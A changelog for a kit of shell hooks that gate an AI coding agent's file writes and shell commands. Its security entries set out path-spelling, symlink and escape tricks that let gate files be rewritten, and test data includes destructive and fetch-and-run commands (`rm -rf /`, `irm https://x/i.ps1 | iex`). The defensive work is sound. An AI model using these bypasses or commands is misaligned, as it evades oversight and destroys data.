# Changelog

Notable changes to this project are recorded here. Format follows [Keep a Changelog](https://keepachangelog.com/en/),
versioning follows [SemVer](https://semver.org/).

## [Unreleased]

### Security
- **The write-side gate matched the raw path string, so a gate file could be reached under a different
  spelling.** `guard-write.sh` compared `file_path` verbatim against `*/.claude/hooks/*` and `*/.git/hooks/*`.
  Measured against 2.6.0, every one of these returned rc=0 — a single Write call each, no shell access, no
  symlink, no second step: `.claude/skills/../hooks/guard-bash.sh`, `.claude//hooks/…`, `.claude/./hooks/…`,
  `.git/refs/../hooks/pre-commit`, and any path written with Windows separators (five other hooks in the kit
  already fold those; this one did not). **On Windows that last one was the whole gate**: measured on a real
  Windows install, 124 of 124 `file_path` values the harness actually sent used backslashes, so the write-side
  §4.5 gate recognised the one spelling that never arrives and passed the one that always does. The traversal
  forms are a capability rather than an observed pattern — none of those 124 samples contained an unresolved
  `..` — but Claude Code passes `file_path` to the hook verbatim (measured: a `..` survives into the payload)
  while the filesystem resolves it, so the string the model writes and the file it opens are two different
  things whenever it chooses to write one. The target is now folded and lexically resolved before it is matched, with
  parameter expansion only: no new process on a path that runs before every Write/Edit, measured at the same
  external-command count as before. A symlinked ancestor — the one shape lexical resolution cannot see — is
  refused outright inside `.claude/` and `.git/`; that walk stops AT the config directory, so a symlinked
  project root (routine on macOS, where every path through `/tmp` resolves to `private/tmp`) does not turn
  ordinary work into a refusal.
- **`NotebookEdit` walked past the gate wherever neither `jq` nor `python3` runs.** The pure-bash tier read
  `file_path` only, and a notebook carries its path under `notebook_path`. Both guards now share one JSON
  parser, marked in both files and pinned byte-identical by the suite, so the two copies cannot drift.
- **The discipline document was writable.** `.claude/DISCIPLINE.md` is kit-owned, imported into every session,
  and is the text of §4.1–§4.5 — the rules the gates enforce — yet no gate covered it: the rules could be
  emptied without touching a single gate. Both guards now refuse to write it, on the shell side and the file-
  tool side. Reading it is unchanged, and the installer still rewrites it on update.
- **An unparseable payload no longer exits 0 unconditionally.** It is refused when the raw text names a gate
  tree and still allowed otherwise, so a future field rename costs a false block rather than a free pass.
- **A case-spelled gate path was a different string and the same file.** APFS and NTFS are case-insensitive by
  default: measured on one machine, `.claude/hooks/guard-bash.sh` and `.CLAUDE/HOOKS/GUARD-BASH.SH` share an
  inode, and a write through the uppercase spelling landed in the real gate script. The shell-side guard had
  always folded case; the write-side guard had not, so the two halves of §4.5 disagreed about the same path.
  Both now fold, and so does a trailing dot or space on a component — Win32 strips those when it opens a file,
  and one trailing byte was enough to slip past the `DISCIPLINE.md` rule, which is an exact tail match.
- **A symlink is the two-step version of editing a hook, and only one direction of it is dangerous.**
  `ln -sfn .claude cfg` names no gate path, so it passed the shell guard; `cfg/hooks/guard-bash.sh` then names
  no gate path either, so it passed the write guard — measured end to end, both steps allowed, the gate script
  overwritten. The write guard now walks the target's ancestors (a builtin test, no process) and, only when one
  really is a symlink, spends a single call to resolve it and ask the same question about the real location.
  That walk runs before `..` is collapsed, because collapsing first deletes the component that has to be
  examined: with `c -> .claude/skills`, `c/../hooks/x` reduces to `hooks/x` while the filesystem resolves it
  onto the gate. The shell guard separately refuses a link whose target is `.claude` or `.git` itself.
  The other direction — a symlinked home, mount, checkout, or plain `/tmp` on macOS — stays ordinary work.
- **The new parser brought a cost with it, and it is capped rather than hidden.** What it replaces was a single
  `sed` — linear, never slow — and it was replaced because it truncated the value at the first escaped quote
  and never looked at `notebook_path`. The parser that fixes those walks the value character by character,
  which is quadratic in bash, and on the tier a stock Windows install runs every path separator is an escape,
  so the cheap path never fires: measured 0.09s at 512 bytes, 0.52s at 1,024, 3.7s at 2,048 and roughly 30s at
  4,096, against this hook's own 60s timeout — and a PreToolUse hook killed at its timeout emits no exit 2, so
  the write proceeds. The value is therefore capped at 2,048 bytes and refused above it, in both guards. Real
  paths are nowhere near that: the `file_path` values measured on a Windows install average about 60 bytes,
  and Windows stops at 260 without the long-path opt-in. Ordinary cost is unchanged — ten real Windows-shaped
  calls in 0.08s total, and the same external-command count on the hot path as before.
- **A `\uXXXX` escape became a literal `?`,** so `\u002eclaude/hooks/guard-bash.sh` decoded to something that
  matched no rule while `jq` decoded the same bytes to the real path — the parser tiers disagreed on whether a
  payload was an attack. Printable ASCII is now decoded properly, with no added process.
- **The plugin edition's own gate scripts sat outside every pattern.** They live at
  `$CLAUDE_PLUGIN_ROOT/hooks/`, which is not `.claude/hooks/`, so one of the four channels shipped an
  unguarded copy of the gates it ships. Matched by the kit's own filenames, so a project's unrelated `hooks/`
  directory is untouched.

### Fixed
- **A tool was still being chosen on whether it EXISTS in thirteen more places.** 2.6.0 taught the two shell
  guards to pick a parser tier on whether it *works*, because Windows ships a Microsoft Store redirector named
  `python3` that passes `command -v`, exits 49 and prints nothing. The same shape survived elsewhere; an audit
  of every `command -v` / `type -P` / `[ -d .git ]` site in the tree found it and each instance was reproduced
  with a stub that resolves and fails, then re-measured in three states (works / broken / absent).
  - `hooks/skill-trust.sh` — a broken `sha256sum` returned an empty digest, the caller read that as "nothing to
    report", and the unvetted-component notice went **completely silent** while two working fallbacks were
    never tried. Measured: 462 bytes of notice became 0. The pipeline's exit status could not have caught it
    (`cut` succeeds on empty input), so the value is what is tested now. Costs one process fewer than before.
  - `hooks/session-rehydrate.sh` and `hooks/board-sync.sh` — jq's status was discarded, so a broken jq emitted
    nothing with rc=0, which is exactly the legitimate "nothing to say" case. After `/compact` or `/clear` the
    fresh context was never pointed at the handover file. The bash fallback below each produces byte-identical
    output, so falling through costs nothing.
  - `hooks/context-usage.sh` — the last hook selecting on existence: with a broken jq it reported "usage not
    found" instead of falling back to awk, so the session fill silently stopped being measured.
  - `eval/doctor.sh` — a broken jq made doctor call a **valid** `settings.json` corrupt and prescribe
    overwriting it, destroying any hooks the project had added, while three real checks stopped running with no
    trace. The same file already probed python3 by running; §4 was missed.
  - `adopt.sh` — a broken jq aborted the settings merge and wired **zero** kit hooks, while the run still ended
    in OK + PROOF and the handover record claimed the hooks had been refreshed.
  - `start.sh` — `[ -d .git ]` is a proxy for the answer and it lies where it matters: in a worktree or
    submodule `.git` is a FILE, so the commit gate was never armed and the installer reported no problem.
    Measured: a commit carrying a forbidden expression landed in a worktree install. It now anchors on the
    repository toplevel and lets the arming call itself decide — a relative `core.hooksPath` resolves against
    the work-tree root, so arming from a subdirectory would report a gate active over a dead path.
  - `bin/cli.js` — a path converter that resolved and produced nothing yielded an empty path, and the npx
    install failed with "bash cannot read the staged script", sending the user after 8.3 names and `TEMP`
    settings for what was a converter failure.

- **The harness that exists to catch this class was breaking the rule in fourteen places.** Measured with a
  stub jq: the suite reported **340 errors against 95 graded assertions**, most of them accusing shipped files
  of defects they do not have. After the fix the same run is **PASSED, 572 graded, 4 skipped**, each naming
  what it could not check — and under `CI=true` those `tool`-class skips turn CI red. Ten jq selections are now
  probed by running; the two git fixtures are gated on whether git can actually **build a repository**, because
  the driver short-circuits and a failed `git add` made every blocking case read as "the gate blocked" (proved
  by replacing the scanner with `exit 0` and getting byte-identical output); and the stdin-hang case now tests
  for the FIFO rather than for `mkfifo`, because without one the case could not fail at all.

### Added
- **A gate for infrastructure teardown.** `terraform`/`tofu`/`pulumi destroy`, an unattended `apply`, and
  `kubectl delete`/`helm uninstall` have the same shape as the `rm -rf` and `git reset --hard` rules the kit has
  always carried — one command, no undo — and were never named, although the blast radius is a cloud account or
  a cluster rather than a disk. **Every verb and alias came from the tool's own source, not from memory, and
  that mattered:** the first draft missed `pulumi down`/`dn` (documented aliases for `destroy`), `helm del`/`un`
  (cobra aliases the generated docs page does not list) and `pulumi up --yes` (Pulumi has no `-auto-approve`) —
  each of them empties exactly what the spelling that *was* gated empties. It also let every wrapper through:
  `sudo -u`, `env`, `xargs`, `bash -c "…"`, `$(…)`. Scope is deliberately narrow in the other direction too —
  `--help`, `--dry-run` (which helm's own docs recommend before an uninstall), `kubectl auth can-i` and
  `-auto-approve=false` are ordinary work and are not refused. 40 cases, both directions.
- **`/skill-csk`** routes `AGENT_TEMPLATE.md`, which ships with an install and which no gate ever checked anyone
  reaches — §3b iterates skills and agents only, so the contract document could go stale unread. The command
  ends in the four evals rather than in a claim.
- **A cold-reader pass for `handoff`.** Its definition of done says a new session can resume from the file
  alone, and nothing tested that. The questions are written from the WORK before the file exists — an answer key
  derived from the handover only proves the handover is self-consistent — and are then answered from the file
  alone. `references/cold-reader.md`.
- **Missing discipline in six existing skills**: flaky-test triage with the infrastructure/product split that
  decides whether a retry is ever allowed (`testing`, plus `references/flaky-triage.md`); tests that cannot fail
  (`testing`); receiving a review, closing the easy exits, and asking the git history before treating a bug as
  new (`code-review-csk`); and what to do when the pipeline is red (`ci-pipeline`).
- **Two axes in `dependency-audit`**: install-time execution — the mechanism recent registry compromises
  actually used, which a CVE feed and a code review both miss — and publisher concentration read from the
  registry ACL rather than from the forge's contributor list. Every axis now resolves to assessed-clean,
  assessed-flagged, or not-assessable-here-and-why.

### Changed
- **Ten skill descriptions now say WHEN to reach for them.** Inside this kit the routing is done by
  `route-hint.sh` and the trigger map, which is why the gap was invisible; outside it — a skill copied into
  another project, another client, a bare session — the description is all there is. `BUDGET_SKILLS` moves with
  them, and the bump comment states plainly what it does *not* fix: the listing budget is 1% of the context
  window, so a small-window model is over it either way. What changed is that the remedy is now targetable.
- **Two suite cases stopped depending on jq.** Checking that a *shipped* `settings.json` parses has no
  machine-specific answer, and the doctor fixture was using jq to *build* a known mutation rather than to
  validate anything — so both were gated on a tool whose absence is precisely the platform this kit is most
  fragile on. They now run everywhere; jq still runs where it exists, because a real parser catches shapes a
  balance check cannot, and the check says so rather than claiming to be a parser.

### Added
- **`eval/utilization.sh` — what the kit loads versus what it actually reaches.** Every installed skill spends
  its name and description in every session forever, and `doctor.sh` §4a already reported that cost against the
  budget; the remedy it points at (`skillOverrides: name-only`) needs a list of WHICH skills and nothing
  produced one. This reads the project's own transcripts and reports fired-vs-cold with the bytes the cold ones
  cost. Two shapes count as a firing — a Read of `skills/<name>/SKILL.md`, or the `Skill` tool naming it — and
  both are anchored, because matching a bare name anywhere in the JSON would count the kit measuring itself: a
  single `grep -rn description:` result echoes all 40 paths on one line. It reads the whole session tree, not
  just the top level: measured on one project, 14 transcripts sit at the top and 306 in the per-session
  `subagents/` trees, which is where delegated work — and therefore most skill use — actually happens. An
  absent transcript reports NOT MEASURED, never "0 fired". Current project only unless `--all-projects` is
  asked for; names and counts only, never a path or a prompt. Run in the kit's own repository it says so, since
  a SKILL.md opened to be edited is indistinguishable from one that fired.

### Changed
- **The suite's verdict now carries its denominator, and a skipped case is no longer green.** `SMOKE-TEST:
  PASSED ✅` printed identically whether 584 assertions ran or 298 did (`CSK_SMOKE_SCOPE=install` drops the
  rest), and seventeen places reported a case that did not run as a passing ✅ — so "a tool is missing here" and
  "the gate holds" were the same output. Skips are now counted, listed, and classified: `tool` and `fixture`
  mean the environment failed and turn CI red; `scope` and `platform` are honest answers everywhere and do not.
  The asymmetry is asserted in four states by the suite itself rather than described in a comment.
- **`eval/scan-skill.sh`: three answers instead of two, and one more thing to look for.** `skill-trust.sh` gates
  on this script's exit code and prints "scanner: SAFE" when it is 0 — which is what a target with nothing to
  read returned, so a component nobody had looked at was reported to the user as clean. Nothing-scanned now
  exits 3 and the trust hook reports NOT SCANNED. A skill directory carrying no `SKILL.md` is named rather than
  passed over in silence. And a runtime instruction fetch (`curl …/instructions.md`, a `WebFetch` tied to
  instructions) is HIGH: that one is not a missing pattern but the assumption the trust model rests on — a
  digest answers "have these bytes changed?", which is the wrong question for a file whose bytes say "fetch your
  real instructions from this URL". Measured against the kit's own payload: 63 of 63 files still SAFE.
- **`token-budget` gains the axis none of its rules covered** — what a single command hands back to the context,
  as distinct from what the context holds — and routes the utilization report.

### Tests
- §4.5 grows from 4 write-side cases to 65 new assertions across three tiers (`jq`, `python3`, and the
  pure-bash fallback in the suite's existing no-`jq`/no-`python3` sandbox). Each positive case was first shown
  to wrongly PASS against the hook as shipped in 2.6.0 — that is what makes it a regression pin rather than a
  restatement of current behaviour — and each ships with its negative twin: a `..` in an ordinary source path,
  a project's own skill under `.claude/`, a doc merely named `hooks`, `DISCIPLINE.md.bak`, an unparseable
  payload naming nothing, a file whose *content* quotes a gate path, and an unlinked path under `.claude/`
  that the symlink probe must not catch, ordinary linking (`ln -s dist build`), a project's own `hooks/`
  directory, and — the row that took two tries to write honestly — a *symlinked project root*, which the first
  version of the probe refused. Two of the new rows exist only to tell a working parser from a working
  fallback: a payload whose target is ordinary while its content quotes a gate path, and an assertion on which
  rule fired rather than on the exit code alone, because a row that checks only `rc=2` stays green when the fix
  is deleted and the fail-closed branch answers in its place. One row executes the hook directly rather than
  through `bash <file>`, so the `+x` bit and the shebang are exercised the way the harness exercises them.

## [2.6.0] - 2026-08-25

### Fixed
- **The tool-level gates were failing open on Windows, and had been.** Measured on a stock Windows 11 desktop
  with no Python installed: `rm -rf /`, `git push --force`, a real captured PowerShell
  `Remove-Item -Recurse -Force` payload, `git commit`, and a Write that rewrites `guard-bash.sh` itself all
  returned rc=0 — allowed, silently, in every permission mode, with nothing written to any log. Windows puts
  `%LOCALAPPDATA%\Microsoft\WindowsApps\python3` on PATH by default; it is not an interpreter but the Microsoft
  Store redirector stub, so `command -v python3` succeeds, the stub exits 49 with an empty stdout, and the
  guards read an empty command and allowed the call before reaching `tool_name`. A tier is now chosen on whether
  it WORKS, using the extraction's own exit status — which costs nothing, and on Windows is cheaper than before.
  **If you run this kit on Windows, this is the release to take.**
- **The same wrong question, everywhere else it was asked.** `preflight.sh` reported
  "jq or python → python3 · Everything the kit wants is here" on a machine with no Python at all; `adopt.sh`
  stopped at the stub and never reached `py`, the Windows Python Launcher; `guard-commit-scan.sh` left the
  commit-message trace scan blind, so a co-author trailer in the message shipped unscanned; `smoke-test`
  reported one FALSE GREEN (a check that passed without running) and one FALSE RED (valid JSON called invalid);
  `doctor.sh` reported "delegation is enabled" after reading nothing.
- **A false verdict hiding under that one.** doctor's `[ -z "$DENYSRC" ] && [ "$NOPY" != 1 ] && ok … || bad …`
  cannot express three outcomes: with no usable interpreter the chain was false, so the `||` arm reported
  "the Agent tool is DENIED in:" — an empty list, and a ❌ on a healthy install. Three branches now, and where
  no parser exists doctor greps coarsely and WARNS rather than staying silent: a prompt to look, never a verdict
  it did not earn.
- **Private-key file names are blocked in any case.** `server.PEM`, `id.KEY` and `cert.P12` were committable
  while their lowercase twins were blocked — and on Windows and macOS those are the SAME FILE. Left open in
  2.5.0 on the grounds that widening a gate does not belong inside a performance change; decided here on its
  own terms, with the must-not-block half cased too (`.pem.example`, `key.md`, `KEYS.md`, `monkey.ts`,
  `public.pub` all stay committable).
- **The plugin edition's `pre-commit` and `commit-msg` shipped CRLF on Windows.** `*.sh text eol=lf` does not
  cover extensionless files, and only the `claude-starter/` copies were named in `.gitattributes`. Git Bash
  tolerates it; WSL answers `$'\r': command not found`, which is a gate that is simply not running.

### Changed
- **The hooks that run on every tool call and every turn stopped spawning a process per rule.** `guard-bash.sh`
  ran 31 greps per call, 13 of them asking whether a command that is plainly `ls -la` might be `git`. Each rule
  now sits behind a zero-fork `case` on a literal its own pattern already requires; the rule regexes are
  untouched. Measured on Windows, idle:

  | hook | runs | before | after |
  |---|---|---|---|
  | `guard-bash.sh` | every Bash/PowerShell call | 2,855 ms | **453 ms** |
  | `session-guard.sh` | every turn end | 1,805 ms | **871 ms** |
  | `context-usage.sh` | every prompt | 872 ms | **569 ms** |
  | `session-update-check.sh` | session start | 996 ms | **395 ms** |

  A turn with five tool calls went from roughly 21 s of hook overhead to 7.6 s.

### Measured
- A straight translation of the guard rules to bash `[[ =~ ]]` was tried first and **rejected on measurement**:
  bash's regex engine there does not support `\b` (so `icacls\b`, `git config\b` and the `core.hooksPath` rules
  would have stopped matching) and `$` anchors to the end of the STRING rather than the line (so every rule
  ending `([[:space:]]|$)` would have opened on a multi-line command). Two fail-opens for a speedup.
- Behaviour was compared rather than assumed: all 55 commands from the suite's own guard cases, run through the
  old and the new hook across three tool_name/permission_mode combinations — 165 comparisons, 0 differences,
  twice.
- The real Claude Code PowerShell tool was watched tripping §4.5 in a live session under `bypassPermissions`;
  the same run before the fix was allowed through. PreToolUse does fire under `bypassPermissions` on Windows —
  which does not change the decision to fail closed there, since an observed behaviour with no documented
  contract is still not something to rest a gate on.
- `context-usage.sh`'s bounded stdin read was verified on Git Bash with a FIFO whose writer holds the pipe open
  and silent: `CSK_STDIN_TIMEOUT=2` → 6.3 s, `=10` → 13.0 s. The bound tracks the setting; nothing hangs.

### Added
- `smoke-test §7c` — the interpreter tiers, tested the way they actually fail. §7b takes jq and python3 AWAY;
  that is not the shape the failure had, and it SKIPS on Windows. §7c shadows PATH with a stub that behaves
  exactly like the real one, so it runs everywhere, and fails 4 of 6 against the pre-fix guards.
- `smoke-test §14` — every extensionless shipped hook is pinned to LF, and the two editions ship byte-identical
  files. A drift means one was updated and the other was not.

## [2.5.0] - 2026-08-24

### Added
- **The gates now leave a record, and something reads it.** The claim this kit makes is that rules are enforced
  at the tool level rather than remembered, and the evidence for it was a green test suite — proof the gates
  *can* fire, never a record that they *did*. Those two states leave identical artifacts behind, which is the
  gap the A/B harness kept running into. `/gates-csk` reports what actually tripped: verdict split, per-rule
  counts, and the rules nothing has touched. Its rule inventory is derived from the installed hooks on every
  run, so a rule added to `guard-bash.sh` shows up without anyone remembering a list — a number typed by hand
  drifts with the first component added, as the network diagram's subtitle proved by announcing 11 agents and
  36 skills over a picture it had drawn with 12 and 38.
- **Recording is on by default.** An evidence channel nobody switches on records nothing. It writes rule names
  and verdicts to `.claude/gate-log.tsv`; the command text is left out unless `CSK_GATE_LOG_CMD=1`, because the
  report prints counts and never the argument, so the one field that can carry a path or a token buys nothing.
  The default path is used only outside a git repo or where it is already ignored — this repo demonstrated the
  alternative by leaving an untracked log sitting in `git status`.
- **Absence is reported as three different answers.** Nothing recorded with somewhere to write means zero
  firings; nowhere to write means NOT MEASURED; no hooks means the rules could not be read. "Zero" and "never
  looked" have been confused here before, in the traffic statistics, and the fix there was the same one.
- **`automode-policy`, an audit of the auto-mode classifier.** Auto mode became the default permission mode on
  2026-08-14, putting a second decider in front of the same actions. The skill reports what that classifier is
  configured with and catches its silent failure: an `autoMode` array set without the literal `"$defaults"`
  replaces the built-in list for that section, taking `soft_deny` from 66 rules to 2 with no error and no
  warning. It does **not** claim its own rules are enforced — see Measured below.

### Fixed
- **PowerShell commands went through no rule at all.** Claude Code's hooks reference says to inspect shell
  commands with `Bash|PowerShell`; the kit matched `Bash` alone. That tool is on by default for claude.ai and
  Console accounts, and on Windows without Git Bash it is enabled automatically while the Bash tool is never
  registered. Measured through the guard beforehand, every one allowed: `Remove-Item -Recurse -Force C:\proj\*`,
  `rm -Recurse -Force ~`, `irm https://x/i.ps1 | iex`, `Get-Content .env`, `Set-Content` on a hook file. The git
  rules already carried over, because git's syntax does not change. The fix extends three existing verb
  alternations rather than duplicating rules; only families with no POSIX twin are new. One instructive detail:
  `cat` was already in the reader list and happens to be a PowerShell alias for `Get-Content`, so the rule
  looked like it covered PowerShell while the real names walked through.
- **A hook that ran on every prompt could hang forever.** `context-usage.sh` read stdin with `cat` whenever
  stdin was not a tty, and "not a tty" is not "data is coming": an open, silent pipe blocked it indefinitely.
  It hung this project's own suite twice, for twenty minutes each. The bound had to keep the real hook path
  working — `read` returns non-zero at EOF without a trailing newline and still assigns, so gating on its exit
  status alone threw the whole payload away and every measurement reported "unmeasurable".
- **Two sections of `doctor` were silent no-ops.** They called a helper defined further down the file, so the
  lines never printed and the only evidence was `skip: command not found` on stderr. The suite had grepped
  `doctor.sh` for the wiring instead of running it, and passed. It runs it now, and also runs it with the
  `claude` CLI off PATH, because a case written on a machine that has it only ever exercises one branch.
- **The diagnostics contaminated the evidence.** `doctor`'s probe drives the real guard to check it is not
  neutered, so every run wrote a synthetic force-push block into the log the report then counted.
- **The installer rehearsal asserted component counts as typed constants**, so adding a skill turned every arm
  red with "expected 39 skills, got 40" — a stale number reading as a broken install. Derived from the payload
  now.

### Measured
- **`autoMode` prose rules are not a gate.** In an interactive session with the policy installed in user
  settings and listed by `claude auto-mode config`, a `hard_deny` rule naming `git reset --hard` verbatim did
  not stop it — and a control run with no policy behaved identically, so the classifier does not gate that
  class of action at all. Two headless probes agreed, including an absolute "never write any file" rule and a
  protected-path write the documentation says auto mode routes to the classifier. What protected the work in
  every run was the model choosing to back it up first: discipline, not a gate. The skill ships with this
  written into it, and reports configuration rather than enforcement.

### Known limits
- **Windows without Git Bash is not supported by the gate layer.** The hooks are shell scripts, so nothing runs
  there and no gate holds; the installers cannot run there either. A clean fix is blocked by the configuration
  model rather than by effort: `hooks.json` is static and platform-blind, and `if` filters on permission rules
  and not on OS. Both READMEs say so, and `doctor` reports a pre-2.5.0 `Bash`-only matcher as a failure, since
  an upgraded install looks healthy while every PowerShell command walks past the destructive-operation rules.

## [2.4.0] - 2026-08-19

### Added
- **A commit gate for machine-private strings.** A work project's absolute path, pasted from a terminal into a
  CHANGELOG entry, shipped in eight consecutive releases before anyone read it back — the paste is the vector,
  so the gate sits where pasted text becomes a commit. `pre-commit` gained a third scanner. Its terms are not a
  pattern, because "is this path private?" is not a question a pattern can answer: `/Users/me` is a placeholder
  every README wants and `/Users/ada` is a real person's home, and no ERE separates them. They come instead from
  the machine doing the committing, where the answer is knowable exactly — its own `$HOME`, in the three
  spellings Windows writes the same directory as — plus a `.private-terms.txt` the repo owner fills in with the
  internal project, client and host names only they can recognise. `.private-allowlist.txt` is the escape.
  New installs gitignore the term file from the start: publishing a list of things you do not want published
  would defeat it.
- **The executable bit is pinned, in the git index as well as on disk.** Rewriting a file in place creates a new
  file, and a new file does not inherit the old one's mode; nothing noticed, because hooks are invoked through
  `bash <path>` and the installer chmods on the way in, so a broken mode is visible only in git. Skipped where
  `core.fileMode=false`, since an index that does not track the bit cannot be wrong about it.

### Fixed
- **`guard-bash.sh` judged the payload instead of the command.** With neither `jq` nor `python3` on PATH — the
  stock Git Bash state — the fallback handed the entire hook JSON to the §4.4/§4.5 matchers. A session id whose
  second group starts `f8` matches the force-push rule, so every ordinary `git push` was hard-blocked; when it
  did not misfire, the §4.4 prompt quoted raw JSON instead of the command being approved, which is consent
  theatre. Replaced by a pure parameter-expansion slice of `tool_input.command`: no forks at all, so it is
  cheaper than the `sed` it replaces, and it takes the *first* `"command"` key so a decoy inside the command
  cannot relocate the parse. Verified on Git Bash 5.2 against `jq`'s own verdicts across fifteen payloads.
- **The transcript directory was derived with the wrong rule, so Windows could never measure context fill.**
  Folding only `/` and `.` misses the drive letter and every underscore; the by-hand `context-usage.sh` /
  `session-stats.sh` call therefore found nothing at all on Windows, and three sessions in a row reported
  "could not measure" and dropped the 🔋 line. The client folds `:` `\` `/` `.` and `_`, and the native path
  comes from `pwd -W` where it exists.
- **A machine-private path in the 2.0.2 entry.** Scrubbed here; history and published tarballs are deliberately
  left alone, since the string is a folder path rather than a credential and rewriting a public repo's history
  costs more than it returns.

### Changed
- **The no-jq gate now discriminates, and its harness stopped lying.** The existing assertions — `commit` asks,
  `reset --hard` blocks — were true of the broken blob as well, so they passed throughout the defect's life. The
  sandbox they ran in was built with `command -v`, which answers with a bare name when a shell function shadows
  the tool, producing a symlink pointing at itself; `jq` also stayed visible through the shell's hash table, so
  the section silently skipped in a full run while passing in isolation. It now resolves with `type -P`, probes
  from a fresh process, carries a canary, and a skip is a failure that states its reason — except where the
  platform genuinely cannot host a jq-less PATH, which is a note, not a regression.
- Twenty-three new behavioural assertions, each sabotage-tested: the gate must fail when the fix is reverted.

## [2.3.2] - 2026-08-19

### Fixed
- **The adversarial pass claimed an independence it could not deliver.** `verify.md` required N independent
  verifiers, each "blind to the other verifiers' reasoning", and never said *where* they run. Three passes inside
  one context window have already read the first one's reasoning: the blindness was a wish rather than a
  property, and the unanimity it produced was one argument counted three times. Found by comparing the kit
  against a deliberation framework — the comparison turned up a defect in our own file rather than an idea to
  borrow.

  Each verifier is now its own subagent, handed the claim and the `file:line` but not the finder's argument. When
  isolation did not happen the verdict says so (`VERIFIERS: 1 (single pass, not isolated)`): one honest pass is
  useful, while three entangled ones labelled independent are worse than one, because they launder confidence.
  Isolation is not free — each subagent re-pays for its own context — so it is spent by stake: blockers at N=3
  (5 for a release audit), medium at N=1, nits get an inline pass and are labelled as such.

  Two more from the same reading. The N verifiers all ran the same four steps, so they failed in the same place
  and called it agreement; each now takes a different attack — reachability, protection, reproduction, plus
  exclusion rules and blast radius at N=5 — and the verdict block records which lens produced it. And unanimity
  **for the same reason** now triggers a counterfactual pass before it is accepted, with `AGREEMENT` in the block
  so a reader can discount a verdict without redoing the work.

### Added
- **Refusals are recorded, because they were the lock's only evidence and it left none.** A refused claim printed
  to stderr and stopped there — nothing on the board, nothing in history. The question the team board exists to
  answer, *how often did this actually stop two people starting the same work*, was unanswerable and would have
  stayed so after a trial, because the data would never have been created. An instrument cannot be fitted after
  the experiment; everything else a trial needs (decisions recorded, how long items were held, the `[chore]`
  ratio) is computable from durable history afterwards, and this alone is not.

  Each refusal appends `timestamp | item | reason | who tried | who held it` to the board — on the board rather
  than in a local counter, since a number only its author can see says nothing about a team. Refusals are rare by
  construction, so a push each costs little and rides the same fast-forward retry as every other write. Logging
  failure is swallowed: a refusal that cannot be recorded is still a refusal. Nothing reads the log yet,
  deliberately — a reader can be written from durable history after a trial, and building a dial for a machine
  nobody has run is the wrong order.

- **Four audit agents carry a calibration rule** in their own contract, which is their system prompt and so
  present every time they run: say which precondition is unproven rather than rounding severity up; write
  "unmeasured", never "slow", and name the measurement that would settle it; rank privacy findings by what a data
  subject actually loses and cite the article relied on; for any "fixed"/"passes" claim name the command whose
  exit code was checked, or downgrade the claim.

  These began as blind-spot *diagnoses*, borrowed in shape from that same framework. Written out, they made
  confident claims about how these agents behave that nobody here had observed — the assert-without-evidence this
  repo refuses everywhere else. Worse than inconsistent: a diagnosis points a direction, and for three of the four
  it pushed toward the more expensive error. An under-flagging security auditor misses a vulnerability, a
  downgrading review lets a real blocker through, a quiet privacy audit has legal consequences. What survives is
  the half that never depended on direction — instructions rather than adjectives. The diagnostic version remains
  worth having and has to be earned: a fixture with planted defects, false positives and misses counted, and then
  the claim has both a number and a direction.

- `confidence-check` gains the smallest of these: fix the deciding rule, and the kill criterion, before the
  options exist, since a criterion chosen afterwards is shaped by them. Its own text says plainly that this one is
  discipline and not a gate.

### Changed
- The reference gate learned a form it had never met: a `SKILL.md` may point at **another** skill's `references/`
  file, so the verifier contract lives in one place instead of a copy that drifts. Widened, not weakened —
  asserted in three states: a bogus skill prefix fails, a valid skill with a missing file fails, the correct
  pointer passes.

## [2.3.1] - 2026-08-11

### Fixed
- **A skill told its agent to check the official source, and the agent had no way to.** `privacy-compliance`
  instructs its agent to read the official KVKK/GDPR text rather than decide from memory, and gives the URLs.
  `privacy-agent-csk` shipped with `Read, Grep, Glob` — no `WebFetch`. A rule an agent cannot obey does not fail
  loudly; it degrades into the thing the rule forbids. Found during a real regulatory audit, where the routing
  had to split the work by hand — code review to the specialist, legislation to `general-purpose` — and a human
  noticed the split and asked why. That is the kit compensating for its own defect, and it does not generalise.

  The agent gets `WebFetch`. Scoped by evidence rather than symmetry: the security skills were checked too and do
  not need it, because their authority is a tool they can already run (`npm audit`, `pip-audit` via Bash), not a
  document to retrieve — a capability no skill asks for would be an idle component.

  The class is gated now. A skill declares what it needs (`<!-- Requires-tool: X -->`) and `smoke-test` checks it
  against every agent that applies that skill. Declared rather than inferred: guessing "this skill probably needs
  the web" from prose would make the gate a heuristic, and a heuristic gate is one nobody believes when it fires.
  Asserted both ways — green as shipped, red naming the agent, the tool and the skill when `WebFetch` is removed.

### Added
- **The project declares which privacy regimes apply; the kit stops guessing.** KVKK and GDPR were hardcoded —
  right for the two regimes this author's projects live under, wrong as a general claim: a product sold in
  California is under CCPA, one in Brazil under LGPD. Shipping a global list would have been worse than the gap,
  because the kit would be claiming knowledge it does not have — the same mistake as rating code without running
  the analyser.

  A project declares its own in `.claude/regulations.conf` (`name | official source | axis`, one per line) and the
  authority is whatever source it names. No installer writes that file and no update rewrites it; its absence
  means the defaults apply, so nothing has to be created for the common case and neither installer changed.

  | declared | result |
  |:--|:--|
  | with a source | audited; every finding cites that regime's article, checked against the source |
  | without a source | **not ruled on** — reported as "declared, no source given" |
  | axis other than `personal-data` (BDDK, PCI-DSS, HIPAA) | **said out loud as out of scope** |
  | no file | KVKK + GDPR, exactly as before |

  The third row is the point of the file, not an edge case: somebody who writes `BDDK` into it and gets a clean
  report would reasonably conclude the kit checked it. It did not, and silence would be the lie. Sector regulation
  stays outside this skill deliberately — the method is identical but the kit has no authority there.

  The agent keeps its name; its description and triggers widen instead (`ccpa`, `lgpd`, `data protection
  regulation`), with a golden-routing case that fails if that stops matching. Where the explanation lives was a
  budget decision, not a style one: skill descriptions had 9 bytes of headroom and the discipline had 1, so it
  went in the skill body, which loads only when the skill fires.

  Honest boundary, stated in the skill itself: this half is instruction, not a gate. Whether a citation is correct
  cannot be settled by an exit code.

## [2.3.0] - 2026-08-11

### Added
- **A team board whose claim is an atomic lock, so two people cannot start the same work item.** Every install
  runs on one machine and `docs/` is gitignored, so a plan, a handover and an in-progress item are all private
  by default — which is how three people on one repo end up building the same thing twice and finding out at
  merge time. The board is the shared half: the item list, the claims, the per-item handover notes and the
  team's decisions live on a git ref the whole team pushes to.

  **The claim IS the push.** Pushing to a ref is fast-forward-only, so of two simultaneous claims exactly one
  lands and the loser re-reads the board and refuses — naming who holds it and what is free — in under a second,
  before a line of code exists. No server, no token, no daemon: the atomicity is git's own. Measured with three
  clones racing the same item over ten rounds (exactly one winner every round, refusal in 691 ms) and again
